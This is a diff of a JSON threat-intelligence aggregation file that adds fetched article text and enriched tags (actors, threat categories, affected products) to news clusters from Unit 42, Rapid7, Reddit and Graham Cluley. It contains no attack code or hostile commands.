+            ],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Linux kernel": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "22c0f52b2c",
       "priority_score": 16,
       "member_count": 1,
@@ -3921,8 +4056,8 @@
     {
       "cluster_id": "bb2f04ae6d",
       "priority_score": 16,
-      "member_count": 3,
-      "corroborating_source_count": 3,
+      "member_count": 4,
+      "corroborating_source_count": 4,
       "strong_signals": [
         "Android"
       ],
@@ -3947,7 +4082,8 @@
         ],
         "confidence_tier": [
           "tier_1_primary_research",
-          "tier_4_news"
+          "tier_4_news",
+          "tier_5_chatter"
         ]
       },
       "primary": {
@@ -4073,6 +4209,34 @@
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Android": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Reddit r/msp",
+          "cohort": "reddit_practitioner_osint",
+          "title": "Real Roboshadow reviews",
+          "link": "https://www.reddit.com/r/msp/comments/1tqel00/real_roboshadow_reviews/",
+          "published": "2026-05-28T19:59:09+00:00",
+          "summary": "I’m evaluating RoboShadow and trying to understand how MSPs are using it in the real world. Is it mainly a cyber hygiene / vulnerability reporting tool, or are people using it as a core part of their managed security stack? A few specific questions: How useful and accurate has the data been? Is it mostly surfacing issues you already knew about, or is it finding meaningful gaps? Has it replaced anything for you, such as CyberCNS / ConnectSecure, Network Detective, Nessus basic vulnerability scanning, or custom scripts? How much of the value is in the reporting and MSP workflow versus the actual scan capability? Android app seems half baked, am i supposed to sign in and have the scan data from android app in dashboard? UI is confusing. Are people relying on this for patching? Any concerns with giving it tenant permissions or deploying another agent/app into client environments? I see a lot of changes announced. Have rapid product changes introduced any stability or security concerns? My ",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Android"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_5_chatter",
             "role_map": {
               "Android": "target"
             },
@@ -4214,10 +4378,19 @@
       "strong_signals": [],
       "taxonomy": {
         "threat_categories": [
-          "ransomware_extortion"
+          "data_breach",
+          "ransomware_extortion",
+          "supply_chain"
         ],
-        "actor_attribution": [],
-        "affected_industries": [],
+        "actor_attribution": [
+          "Cl0p",
+          "ShinyHunters"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "healthcare",
+          "manufacturing_industrial"
+        ],
         "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
@@ -4237,14 +4410,23 @@
         "link": "https://unit42.paloaltonetworks.com/cyber-extortion-economy/",
         "published": "2026-05-27T22:00:46+00:00",
         "summary": "Unit 42 explores trends in data theft and extortion, outlining key strategies for organizations as frontier AI models advance. The post Out of the Crypt: The Evolving Cyber Extortion Economy appeared first on Unit 42 .",
-        "full_body": "",
-        "fetch_status": "fetch_failed:ReadTimeout",
+        "full_body": "Threat Research Center Insights General General Out of the Crypt: The Evolving Cyber Extortion Economy 8 min read Related Products Unit 42 Frontier AI Defense Unit 42 Incident Response By: Matt Brady Justin Moore Published: May 27, 2026 Categories: Cybercrime General Insights Tags: Bling Libra Extortion Frontier AI Hazy Scorpius Scattered LAPSUS$ Hunters ShinyHunters Supply chain Telegram TGR-CRI-1135 Share Extortion Activity No Longer Requires Encryption for Payment This blog dives into the growing trend of data theft and extortion activities which no longer require the use of ransomware to pressure victims into paying a demand. We examine the financially-motivated threat actors using both single and double extortion techniques and what this means for organizations going forward, especially with the arrival of frontier AI models. Shifting Threat Landscape Observations As detailed in our 2026 Global Incident Response Report , Unit 42 observed a notable decrease in the use of encryption for extortion-related cases last year. The total percentage in 2025 dropped to 78%, much lower than the near-or-above-90% levels observed between 2021-2024. Other security organizations have seen similar trends, with Google reporting a gradual rise in data theft and extortion incidents from approximately 2% in 2020 to 15% in 2025. Resilience also observed an increase in extortion-only incidents in 2025, rising from 49% in the first half to 65% in the second half. Threat actors tracked by Unit 42 that have demonstrated a willingness to shift away from using ransomware to pure data theft and extortion include Bling Libra’s (aka ShinyHunters) focus on software-as-a-service (SaaS) applications and Hazy Scorpius’s (aka CLOP) exploitation of an Oracle EBS vulnerability . When examining this precipitous drop in encryption, we see four primary drivers: advanced backup and recovery performance allowing routine re-imaging and restoration, endpoint maturity and automated disruption efficacy, exfiltration speed and the increased pressure from regulatory frameworks where non-compliance fines, class-action lawsuits and systemic reputational damage are greater leverage than operational downtime. In 2025, pure data-exfiltration campaigns heavily targeted Professional Services, Healthcare and Consumer Services firms with threat actors specifically focused on mid-sized organizations accounting for 64% of victims. Interestingly, while Manufacturing remains the single most disrupted sector overall, Construction has witnessed a 44% year-over-year increase as a data-only extortion hotspot . These firms are attractive targets due to lucrative financial blueprints and bidding data combined with data egress controls. The current data-only extortion economy is directly fueled by a heavily-regulated compliance landscape, which threat actors have effectively weaponized. Strict mandates like the SEC's 4-day disclosure window and GDPR’s 72-hour reporting rule have created a regulatory countdown clock, allowing threat actors to force rapid negotiations before organizations can complete internal assessments. Because global privacy frameworks, state-level breach notification laws and post-leak class-action litigation have driven the average cost of data-theft extortion to $5.08 million (and over $10 million for broader U.S. breaches), data exposure alone carries disastrous financial liabilities. Threat actors recognize that regulatory penalties are so severe that the compliance framework itself compels corporate payouts. As recently noted by our Chief Security Intelligence Officer, Wendi Whitmore, it only took 39 seconds for threat actors to move from initial access to data exfiltration in one case. Differences in Extortion Operations Unit 42 is actively monitoring several threat actors that are continuously conducting data theft and extortion operations. The notable differences between these attackers is their use of initial access techniques and the number of extortion techni",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
-            "ransomware_extortion"
+            "ransomware_extortion",
+            "supply_chain",
+            "data_breach"
           ],
-          "actor_attribution": [],
-          "affected_industries": [],
+          "actor_attribution": [
+            "ShinyHunters",
+            "Cl0p"
+          ],
+          "affected_industries": [
+            "healthcare",
+            "financial_services",
+            "manufacturing_industrial"
+          ],
           "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
@@ -4268,10 +4450,19 @@
           "summary": "Unit 42 explores trends in data theft and extortion, outlining key strategies for organizations as frontier AI models advance. The post Out of the Crypt: The Evolving Cyber Extortion Economy appeared first on Unit 42 .",
           "taxonomy": {
             "threat_categories": [
-              "ransomware_extortion"
+              "ransomware_extortion",
+              "supply_chain",
+              "data_breach"
             ],
-            "actor_attribution": [],
-            "affected_industries": [],
+            "actor_attribution": [
+              "ShinyHunters",
+              "Cl0p"
+            ],
+            "affected_industries": [
+              "healthcare",
+              "financial_services",
+              "manufacturing_industrial"
+            ],
             "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
@@ -4295,11 +4486,17 @@
       "strong_signals": [],
       "taxonomy": {
         "threat_categories": [
-          "apt_espionage"
+          "apt_espionage",
+          "phishing_social_eng"
         ],
-        "actor_attribution": [],
+        "actor_attribution": [
+          "APT29"
+        ],
         "affected_industries": [],
-        "affected_products": [],
+        "affected_products": [
+          "Azure",
+          "Microsoft Entra"
+        ],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
@@ -4318,24 +4515,40 @@
         "link": "https://unit42.paloaltonetworks.com/roadtools-cloud-attacks/",
         "published": "2026-05-22T10:00:24+00:00",
         "summary": "Open-source framework ROADtools is being misused by threat actors for cloud intrusions. Learn how to identify its malicious use. The post Paved With Intent: ROADtools and Nation-State Tactics in the Cloud appeared first on Unit 42 .",
-        "full_body": "",
-        "fetch_status": "fetch_failed:ReadTimeout",
+        "full_body": "Threat Research Center Threat Research Cloud Cybersecurity Research Cloud Cybersecurity Research Paved With Intent: ROADtools and Nation-State Tactics in the Cloud 14 min read Related Products Cortex Cortex Cloud Cortex XDR Cortex XSIAM Unit 42 Cloud Security Assessment Unit 42 Incident Response By: Bill Batchelor Eyal Rafian Published: May 22, 2026 Categories: Cloud Cybersecurity Research Threat Research Tags: Curious Serpens Entra ID Microsoft Azure Microsoft graph API Midnight Blizzard MITRE ROADtools UTA0355 Void Blizzard Share Executive Summary ROADtools is a publicly available toolkit for offensive and defensive security purposes that attackers have integrated into cloud attacks. The tool is designed to: Enumerate Entra ID Register devices in Entra ID Acquire, exchange and manipulate Microsoft Entra ID tokens ROADtools is an open-source framework written in Python and built for red-teaming and research. It primarily targets the identity and authentication layers of Azure, and focuses on how accounts, applications and tokens operate in tenants. To avoid detection, ROADtools operates through legitimate Microsoft APIs and can mimic typical traffic. Further defense evasion can be achieved by configuring request attributes such as user-agent strings. These capabilities have made ROADtools a valuable asset for attackers. Nation-state threat actors have used it in recent cloud intrusions for discovery, persistence and defense evasion. Attackers involved in a targeted phishing campaign in early 2025 used tooling that matches ROADtools' token management capabilities. We provide an accessible overview of ROADtools, including how it evades detection and how nation-state threat actors and other adversaries misuse it. To aid defenders in protecting organizations against this threat, we also provide: Straightforward hunting queries that can reveal ROADtools usage Practical recommendations to detect and prevent the effectiveness of ROADtools within an environment Palo Alto Networks customers are better protected from the threats described here through the following products and services: Cortex Cloud Cortex XDR and XSIAM The Unit 42 Cloud Security Assessment is an evaluation service that reviews cloud infrastructure to identify misconfigurations and security gaps. If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Microsoft Azure , Cloud , MITRE Tool Overview ROADtools is able to interact with Entra ID via legitimate APIs, and to customize user-agent strings — both of which help it to evade detection. The tool includes several modules — two of which we discuss in this article - and a set of shared libraries. The ROADrecon Module The roadrecon module is designed for internal discovery and enumeration. It gathers organizational data and identity information from Entra ID (formerly Azure Active Directory), including: Users Groups Roles Devices Service principals Applications Directory configurations Results are stored in a local SQLite database that can be viewed through a custom web interface. This provides a graphical way to navigate the tenant and identify relationships or privileged objects that attackers could use for persistence or escalation. Figure 1 shows Entra ID Groups within the ROADrecon graphical web interface. Figure 1. Entra ID Groups in the ROADtools web interface. The roadrecon module originally queried the Azure AD Graph API to enumerate Azure AD resources. However, Microsoft has stated the Azure AD Graph API is being retired and all new or existing applications must migrate to Microsoft Graph API , which breaks a fundamental component of the original roadrecon functionality. As of May 2026, an msgraph branch exists in the official ROADtools Github repository but has not been updated since April 2025. Subsequent development has continued in a separate, community-maintained fork , where partial roadrecon functionality has been impleme",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
+            "phishing_social_eng",
             "apt_espionage"
           ],
-          "actor_attribution": [],
+          "actor_attribution": [
+            "APT29"
+          ],
           "affected_industries": [],
-          "affected_products": [],
+          "affected_products": [
+            "Microsoft Entra",
+            "Azure"
+          ],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "news_report",
           "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
+          "role_map": {
+            "Microsoft Entra": "target",
+            "Azure": "target",
+            "Palo Alto Networks": "mention"
+          },
           "weak_tags": {
-            "products": []
+            "products": [
+              [
+                "Palo Alto Networks",
+                "mention",
+                0.28
+              ]
+            ]
           }
         }
       },
@@ -4349,20 +4562,36 @@
           "summary": "Open-source framework ROADtools is being misused by threat actors for cloud intrusions. Learn how to identify its malicious use. The post Paved With Intent: ROADtools and Nation-State Tactics in the Cloud appeared first on Unit 42 .",
           "taxonomy": {
             "threat_categories": [
+              "phishing_social_eng",
               "apt_espionage"
             ],
-            "actor_attribution": [],
+            "actor_attribution": [
+              "APT29"
+            ],
             "affected_industries": [],
-            "affected_products": [],
+            "affected_products": [
+              "Microsoft Entra",
+              "Azure"
+            ],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
+            "role_map": {
+              "Microsoft Entra": "target",
+              "Azure": "target",
+              "Palo Alto Networks": "mention"
+            },
             "weak_tags": {
-              "products": []
+              "products": [
+                [
+                  "Palo Alto Networks",
+                  "mention",
+                  0.28
+                ]
+              ]
             }
           }
         }
@@ -5158,11 +5387,19 @@
       "strong_signals": [],
       "taxonomy": {
         "threat_categories": [
+          "ddos",
+          "phishing_social_eng",
           "ransomware_extortion"
         ],
-        "actor_attribution": [],
+        "actor_attribution": [
+          "BlackCat/ALPHV",
+          "NoName057(16)",
+          "Scattered Spider"
+        ],
         "affected_industries": [
-          "critical_infrastructure"
+          "critical_infrastructure",
+          "government",
+          "retail_ecommerce"
         ],
         "affected_products": [],
         "tools_used": [],
@@ -5183,15 +5420,23 @@
         "link": "https://unit42.paloaltonetworks.com/fifa-world-cup-attack-surface/",
         "published": "2026-05-28T10:00:53+00:00",
         "summary": "The 2026 World Cup presents major cyber risks from ransomware groups, state-aligned actors, and other groups targeting critical infrastructure. Learn more here. The post 2026 World Cup: Discussing The World’s Biggest Game’s Attack Surface appeared first on Unit 42 .",
-        "full_body": "",
-        "fetch_status": "fetch_failed:ReadTimeout",
+        "full_body": "Threat Research Center Insights General General 2026 World Cup: Discussing The World’s Biggest Game’s Attack Surface 12 min read Related Products Unit 42 Incident Response By: Justin Moore Published: May 28, 2026 Categories: Cybercrime General Hacktivism Insights Threat Research Tags: Fiddling Scorpius Fighting Ursa Muddled Libra Phishing QR Codes Razing Ursa Typosquatting Wiper Share The 2026 FIFA World Cup will be the largest sporting event ever staged. Across 39 days, 16 host cities in three nations will host 104 matches, an expanded 48-team tournament and an estimated five-to-six million in-venue spectators alongside a global broadcast audience approaching half the planet. The tournament opens at Estadio Azteca in Mexico City on June 11, 2026, and concludes at MetLife Stadium in East Rutherford, New Jersey, on July 19, 2026. This is the first World Cup to be jointly hosted by three nations. Each match runs on a temporary, multi-ring tournament network grafted onto pre-existing NFL, MLS, CFL and Liga MX stadium environments. It depends on a network of municipal services, including public transit, signalized traffic, water and wastewater treatment, regional power, airport operations and emergency services. Each of those touchpoints is in scope for an adversary. Based on a review of cyber operations against prior mega-events from 2016 through the Milano-Cortina 2026 Winter Games , this assessment finds that disruptive intrusions, criminal fraud at scale and politically motivated distributed denial-of-service (DDoS) and hack-and-leak operations are highly likely. The only meaningful questions are who, against which targets and at what severity. There are three drivers in the 2026 World Cup risk picture: Iran-nexus activity. The U.S.–Israel–Iran kinetic conflict that began on Feb. 28, 2026 has reordered the threat surface for any U.S.-hosted event. The Handala Hack Team, assessed by the U.S. Federal Bureau of Investigation (FBI) and multiple commercial threat intelligence firms to be a front for Iran's Ministry of Intelligence and Security (MOIS), executed significant wiper attacks in early 2026. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) published a joint advisory AA26-097A confirming an active, ongoing Iranian-affiliated campaign. The campaign targets internet-exposed Rockwell Automation and Allen-Bradley programmable logic controllers (PLCs) in U.S. critical infrastructure, as well as Islamic Revolutionary Guard Corps (IRGC) targeting of Israeli-made Unitronics Vision Series PLCs at U.S. water, energy and municipal targets. These are the same categories of infrastructure that World Cup host cities will be operating under tournament load. Russia-nexus hacktivism. Since 2022, NoName057(16) has conducted over 3,700 verified DDoS attacks against governments and critical sectors in NATO member states. Documented surges keyed to politically symbolic events including the NATO Summit , the Ukraine Peace Summit and claims of intent at the Paris 2022 Olympics and the Milano Cortina 2026 Winter Olympics . Operation Eastwood (July 2025) disrupted but did not eliminate the group. The UK NCSC confirmed continued operations into 2026. The U.S., Canada and Mexico are NATO partners or allies and the World Cup is a politically symbolic event of the highest order. Financially motivated cybercrime. Group-IB identified more than 16,000 fraudulent domains and 90 compromised Hayya fan-portal accounts during World Cup 2022 in Qatar. The 2023 Muddled Libra (operators of ALPHV aka BlackCat ransomware) campaign against entertainment organizations demonstrated that the hospitality stack is a target for ransomware operators . The stack includes reservations, digital keys, point-of-sale (PoS) machines and loyalty data. Ticket fraud, accommodation fraud, transportation QR-code fraud and FanID-equivalent account takeover are prime targets at scale across all three host nations. The Paris 2024 Olympics is a strong example of a recent p",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
-            "ransomware_extortion"
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "ddos"
           ],
-          "actor_attribution": [],
+          "actor_attribution": [
+            "Scattered Spider",
+            "BlackCat/ALPHV",
+            "NoName057(16)"
+          ],
           "affected_industries": [
-            "critical_infrastructure"
+            "government",
+            "critical_infrastructure",
+            "retail_ecommerce"
           ],
           "affected_products": [],
           "tools_used": [],
@@ -5216,11 +5461,19 @@
           "summary": "The 2026 World Cup presents major cyber risks from ransomware groups, state-aligned actors, and other groups targeting critical infrastructure. Learn more here. The post 2026 World Cup: Discussing The World’s Biggest Game’s Attack Surface appeared first on Unit 42 .",
           "taxonomy": {
             "threat_categories": [
-              "ransomware_extortion"
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "ddos"
             ],
-            "actor_attribution": [],
+            "actor_attribution": [
+              "Scattered Spider",
+              "BlackCat/ALPHV",
+              "NoName057(16)"
+            ],
             "affected_industries": [
-              "critical_infrastructure"
+              "government",
+              "critical_infrastructure",
+              "retail_ecommerce"
             ],
             "affected_products": [],
             "tools_used": [],
@@ -5452,118 +5705,6 @@
       ]
     },
     {
-      "cluster_id": "a7f65ff862",
-      "priority_score": 12,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "apt_espionage",
-          "zero_day"
-        ],
-        "actor_attribution": [
-          "Salt Typhoon"
-        ],
-        "affected_industries": [
-          "government"
-        ],
-        "affected_products": [
-          "Microsoft SharePoint"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "zero_day"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Rapid7",
-        "cohort": "offensive_vulnerability_research",
-        "title": "Experts on Experts: Why Compliance is becoming Continuous",
-        "link": "https://www.rapid7.com/blog/post/it-cybersecurity-experts-continuous-compliance",
-        "published": "2026-05-28T13:00:00+00:00",
-        "summary": "This week on Experts on Experts, I’m joined by Sergio Alonso – Rapid7’s Director of Trust, Risk, and Compliance – to talk about how compliance is changing and why many security teams are rethinking the way they approach readiness, reporting, and operational risk. One of the biggest themes in the conversation is that compliance is no longer something organizations can treat as a point-in-time exercise. Frameworks like NIS2 and DORA are increasing expectations around resilience and accountability, while cloud environments and faster release cycles make it harder to prove that controls are working consistently over time. We also discuss the growing gap between security operations and compliance reporting. Security teams generate huge amounts of operational data every day, but translating that into evidence regulators, auditors, and leadership teams can actually use remains a challenge. The conversation looks at how organizations are trying to reduce manual effort, where automation can gen",
-        "full_body": "Back to Blog Industry Trends Experts on Experts: Why Compliance is becoming Continuous Craig Adams May 28, 2026 | Last updated on May 28, 2026 | xx min read DISCOVER RAPID7 MDR This week on Experts on Experts, I’m joined by Sergio Alonso – Rapid7’s Director of Trust, Risk, and Compliance – to talk about how compliance is changing and why many security teams are rethinking the way they approach readiness, reporting, and operational risk. One of the biggest themes in the conversation is that compliance is no longer something organizations can treat as a point-in-time exercise. Frameworks like NIS2 and DORA are increasing expectations around resilience and accountability, while cloud environments and faster release cycles make it harder to prove that controls are working consistently over time. We also discuss the growing gap between security operations and compliance reporting. Security teams generate huge amounts of operational data every day, but translating that into evidence regulators, auditors, and leadership teams can actually use remains a challenge. The conversation looks at how organizations are trying to reduce manual effort, where automation can genuinely help, and why visibility and ownership are becoming more important as regulatory pressure grows. Organizations still treat compliance as separate from day-to-day security operations, and the teams making the most progress are bringing those two worlds closer together, treating compliance less like a reporting layer and more like part of the operational workflow itself. Watch the full episode below to hear the full conversation and how organizations are approaching compliance, risk, and resilience heading into 2026. ⠀ Article Tags Compliance Craig Adams Author Posts Related blog posts Security Operations How Rapid7 is bringing Cyber GRC closer to security operations Sabeen Malik Cloud and Devops Security Rapid7 Completes BSI C5 Type 2 Examination: Stronger Cloud Security for DACH Organizations Georgeta Toth Threat Research Salt Typhoon APT Group: What Public Sector Leaders and Defenders Should Know Rapid7 Labs Threat Research Microsoft SharePoint Zero-Day Exploitation: What Public Sector Leaders Should Know Rapid7 Labs See all posts",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "zero_day",
-            "apt_espionage"
-          ],
-          "actor_attribution": [
-            "Salt Typhoon"
-          ],
-          "affected_industries": [
-            "government"
-          ],
-          "affected_products": [
-            "Microsoft SharePoint"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "Microsoft SharePoint": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Rapid7",
-          "cohort": "offensive_vulnerability_research",
-          "title": "Experts on Experts: Why Compliance is becoming Continuous",
-          "link": "https://www.rapid7.com/blog/post/it-cybersecurity-experts-continuous-compliance",
-          "published": "2026-05-28T13:00:00+00:00",
-          "summary": "This week on Experts on Experts, I’m joined by Sergio Alonso – Rapid7’s Director of Trust, Risk, and Compliance – to talk about how compliance is changing and why many security teams are rethinking the way they approach readiness, reporting, and operational risk. One of the biggest themes in the conversation is that compliance is no longer something organizations can treat as a point-in-time exercise. Frameworks like NIS2 and DORA are increasing expectations around resilience and accountability, while cloud environments and faster release cycles make it harder to prove that controls are working consistently over time. We also discuss the growing gap between security operations and compliance reporting. Security teams generate huge amounts of operational data every day, but translating that into evidence regulators, auditors, and leadership teams can actually use remains a challenge. The conversation looks at how organizations are trying to reduce manual effort, where automation can gen",
-          "taxonomy": {
-            "threat_categories": [
-              "zero_day",
-              "apt_espionage"
-            ],
-            "actor_attribution": [
-              "Salt Typhoon"
-            ],
-            "affected_industries": [
-              "government"
-            ],
-            "affected_products": [
-              "Microsoft SharePoint"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "Microsoft SharePoint": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "cf7fdef083",
       "priority_score": 12,
       "member_count": 1,
@@ -5694,6 +5835,118 @@
                   0.27
                 ]
               ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "a7f65ff862",
+      "priority_score": 12,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "apt_espionage",
+          "zero_day"
+        ],
+        "actor_attribution": [
+          "Salt Typhoon"
+        ],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "Microsoft SharePoint"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Rapid7",
+        "cohort": "offensive_vulnerability_research",
+        "title": "Experts on Experts: Why Compliance is becoming Continuous",
+        "link": "https://www.rapid7.com/blog/post/it-cybersecurity-experts-continuous-compliance",
+        "published": "2026-05-28T13:00:00+00:00",
+        "summary": "This week on Experts on Experts, I’m joined by Sergio Alonso – Rapid7’s Director of Trust, Risk, and Compliance – to talk about how compliance is changing and why many security teams are rethinking the way they approach readiness, reporting, and operational risk. One of the biggest themes in the conversation is that compliance is no longer something organizations can treat as a point-in-time exercise. Frameworks like NIS2 and DORA are increasing expectations around resilience and accountability, while cloud environments and faster release cycles make it harder to prove that controls are working consistently over time. We also discuss the growing gap between security operations and compliance reporting. Security teams generate huge amounts of operational data every day, but translating that into evidence regulators, auditors, and leadership teams can actually use remains a challenge. The conversation looks at how organizations are trying to reduce manual effort, where automation can gen",
+        "full_body": "Back to Blog Industry Trends Experts on Experts: Why Compliance is becoming Continuous Craig Adams May 28, 2026 | Last updated on May 28, 2026 | xx min read DISCOVER RAPID7 MDR This week on Experts on Experts, I’m joined by Sergio Alonso – Rapid7’s Director of Trust, Risk, and Compliance – to talk about how compliance is changing and why many security teams are rethinking the way they approach readiness, reporting, and operational risk. One of the biggest themes in the conversation is that compliance is no longer something organizations can treat as a point-in-time exercise. Frameworks like NIS2 and DORA are increasing expectations around resilience and accountability, while cloud environments and faster release cycles make it harder to prove that controls are working consistently over time. We also discuss the growing gap between security operations and compliance reporting. Security teams generate huge amounts of operational data every day, but translating that into evidence regulators, auditors, and leadership teams can actually use remains a challenge. The conversation looks at how organizations are trying to reduce manual effort, where automation can genuinely help, and why visibility and ownership are becoming more important as regulatory pressure grows. Organizations still treat compliance as separate from day-to-day security operations, and the teams making the most progress are bringing those two worlds closer together, treating compliance less like a reporting layer and more like part of the operational workflow itself. Watch the full episode below to hear the full conversation and how organizations are approaching compliance, risk, and resilience heading into 2026. ⠀ Article Tags Compliance Craig Adams Author Posts Related blog posts Security Operations How Rapid7 is bringing Cyber GRC closer to security operations Sabeen Malik Cloud and Devops Security Rapid7 Completes BSI C5 Type 2 Examination: Stronger Cloud Security for DACH Organizations Georgeta Toth Threat Research Salt Typhoon APT Group: What Public Sector Leaders and Defenders Should Know Rapid7 Labs Threat Research Microsoft SharePoint Zero-Day Exploitation: What Public Sector Leaders Should Know Rapid7 Labs See all posts",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day",
+            "apt_espionage"
+          ],
+          "actor_attribution": [
+            "Salt Typhoon"
+          ],
+          "affected_industries": [
+            "government"
+          ],
+          "affected_products": [
+            "Microsoft SharePoint"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {
+            "Microsoft SharePoint": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Rapid7",
+          "cohort": "offensive_vulnerability_research",
+          "title": "Experts on Experts: Why Compliance is becoming Continuous",
+          "link": "https://www.rapid7.com/blog/post/it-cybersecurity-experts-continuous-compliance",
+          "published": "2026-05-28T13:00:00+00:00",
+          "summary": "This week on Experts on Experts, I’m joined by Sergio Alonso – Rapid7’s Director of Trust, Risk, and Compliance – to talk about how compliance is changing and why many security teams are rethinking the way they approach readiness, reporting, and operational risk. One of the biggest themes in the conversation is that compliance is no longer something organizations can treat as a point-in-time exercise. Frameworks like NIS2 and DORA are increasing expectations around resilience and accountability, while cloud environments and faster release cycles make it harder to prove that controls are working consistently over time. We also discuss the growing gap between security operations and compliance reporting. Security teams generate huge amounts of operational data every day, but translating that into evidence regulators, auditors, and leadership teams can actually use remains a challenge. The conversation looks at how organizations are trying to reduce manual effort, where automation can gen",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day",
+              "apt_espionage"
+            ],
+            "actor_attribution": [
+              "Salt Typhoon"
+            ],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [
+              "Microsoft SharePoint"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
+            "role_map": {
+              "Microsoft SharePoint": "target"
+            },
+            "weak_tags": {
+              "products": []
             }
           }
         }
@@ -6493,105 +6746,6 @@
       ]
     },
     {
-      "cluster_id": "1521771637",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [
-          "Play"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "government",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_3_analysis"
-        ]
-      },
-      "primary": {
-        "source": "Graham Cluley",
-        "cohort": "practitioner_analysis",
-        "title": "MyPillow listed on ransomware gang’s leak site, but denies it has been breached",
-        "link": "https://www.bitdefender.com/en-us/blog/hotforsecurity/mypillow-ransomware-leak-site-denies-breach",
-        "published": "2026-05-28T13:39:39+00:00",
-        "summary": "A notorious ransomware gang claims to have stolen MyPillow's private data, but CEO Mike Lindell calls it a politically motivated \"hit job.\" With the countdown ticking toward a massive dark web leak, who is telling the truth? Read more in my article on the Hot for Security blog.",
-        "full_body": "Industry News 2 min read MyPillow listed on ransomware gang's leak site, but denies it has been breached Graham CLULEY May 28, 2026 The Play ransomware gang is claiming to have stolen data from US pillow manufacturer MyPillow, making off with private and personal confidential data. The claim, which appeared on Play's dark web leak portal earlier this week, threatens that an undeclared amount of data will be released on Friday, potentially exposing \"private and personal confidential data, clients and etc. documents,budget, payroll, IDs, taxes, finance information.\" However, since Straight Arrow News , which first reported details of the alleged ransomware attack, the pillow manufacturers high-profile CEO Mike Lindell has debunked the claims that any security breach has happened at all. Lindell - a high-profile supporter of US President Donald Trump who is currently seeking the Republican nomination for governor of his home state, Minnesota - told Straight Arrow News that he was not aware that any claims had been made about an alleged attack on his company until he was contacted by the press. Furthermore, Lindell says that the claims being made about a ransomware attack are politically motivated: “This is another hit job by outside sources because I'm running for governor. I guarantee it. We do not have any breaches in our data at all.\" Lindell further said that his company had not received any ransomware demands, and that the company does not store any sensitive data internally, relying upon external third parties instead. Whether MyPillow was actually breached is, at the time of writing, unconfirmed. The company denies it has been hit, and the Play ransomware gang claims otherwise. The truth is likely to emerge quickly, as 